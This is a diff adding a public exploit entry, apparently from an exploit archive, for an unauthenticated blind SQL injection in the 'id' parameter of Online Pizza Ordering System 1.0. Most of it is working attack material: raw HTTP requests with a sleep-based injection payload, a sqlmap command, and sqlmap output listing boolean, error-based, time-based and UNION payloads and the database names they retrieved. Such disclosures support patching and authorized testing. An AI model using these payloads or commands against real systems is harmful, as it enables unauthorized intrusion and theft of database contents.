@@ -1,0 +1,88 @@
+id: 38275
+date: 03/20/2023
+title: Online Pizza Ordering System 1.0 SQL Injection Vulnerability
+author: Abdulhakim Öner
+cves: 
+
+# Exploit Title: Online Pizza Ordering System 1.0 - "id" SQLi
+# Exploit Author: Abdulhakim Öner
+# Vendor Homepage: https://www.sourcecodester.com
+# Software Link: https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html
+# Software Download: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-opos.zip
+# Version: 1.0
+# Tested on: Windows, Linux
+
+## Description 
+A Blind SQL injection vulnerability in the (/php-opos/index.php) page in Online Pizza Ordering System allows remote unauthenticated attackers to dump database through arbitrary SQL commands by "id" parameter. 
+
+## Request PoC
+```
+GET /php-opos/index.php?page=category&id=1' HTTP/1.1
+Host: 192.168.1.101
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://192.168.1.101/php-opos/
+Cookie: PHPSESSID=o1tk08lff329ovpl5mt24tkg20
+
+```
+
+This request causes a Fatal Error in the webapp. Adding "'%2b(select*from(select(sleep(20)))a)%2b'" to the end of "id" parameter, the response to request was 200 status code with message of OK, but 20 seconds later, which indicates that our sleep 20 command works. 
+
+```
+GET /php-opos/index.php?page=category&id=1'%2b(select*from(select(sleep(10)))a)%2b' HTTP/1.1
+Host: 192.168.1.101
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://192.168.1.101/php-opos/
+Cookie: PHPSESSID=o1tk08lff329ovpl5mt24tkg20
+
+```
+
+## Exploit with sqlmap
+Save the request from burp to file 
+```
+┌──(root㉿caesar)-[/home/kali/Workstation/php-opos]
+└─# sqlmap -r sql.txt -p 'id' --batch --dbs --level=3 --risk=2
+---snip---
+[13:20:45] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: page=category&id=1' AND 9957=9957-- dMoW
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: page=category&id=1' AND (SELECT 9683 FROM(SELECT COUNT(*),CONCAT(0x717a6b7071,(SELECT (ELT(9683=9683,1))),0x716a6b7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JUhz
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: page=category&id=1' AND (SELECT 1462 FROM (SELECT(SLEEP(5)))HRjs)-- mEaq
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: page=category&id=-1987' UNION ALL SELECT NULL,CONCAT(0x717a6b7071,0x79716851566b7072685458534e4c6f7a75784f50614266454c7746646347794d565a43634b684958,0x716a6b7071)-- -
+---
+[13:20:45] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.54, PHP 8.2.0
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[13:20:45] [INFO] fetching database names
+[13:20:45] [INFO] retrieved: 'information_schema'
+[13:20:46] [INFO] retrieved: 'mysql'
+[13:20:46] [INFO] retrieved: 'opos_db'
+[13:20:46] [INFO] retrieved: 'performance_schema'
+[13:20:46] [INFO] retrieved: 'phpmyadmin'
+----snip----
+```
+
+#  0day.today [2023-03-27]  #
